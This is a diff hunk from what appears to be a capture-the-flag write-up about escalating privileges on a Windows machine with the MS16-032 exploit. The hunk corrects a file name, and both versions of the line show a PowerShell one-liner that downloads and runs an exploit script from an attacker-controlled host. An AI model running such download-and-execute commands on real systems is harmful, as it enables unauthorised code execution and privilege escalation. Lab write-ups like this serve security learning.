@@ -423,7 +423,7 @@ So the exploit will download and run this script once it is done. And I receive 
 Note that I am running the x64 version of powershell here: `C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe` And the x86 version in the exploit: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"`
 
 ```
-C:\Users\kostas\Desktop>C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.21/Invoke-MS16032.ps1')
+C:\Users\kostas\Desktop>C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.21/Invoke-MS16-032.ps1')
 C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.21/Invoke-MS16-032.ps1')
      __ __ ___ ___   ___     ___ ___ ___ 
     |  V  |  _|_  | |  _|___|   |_  |_  |
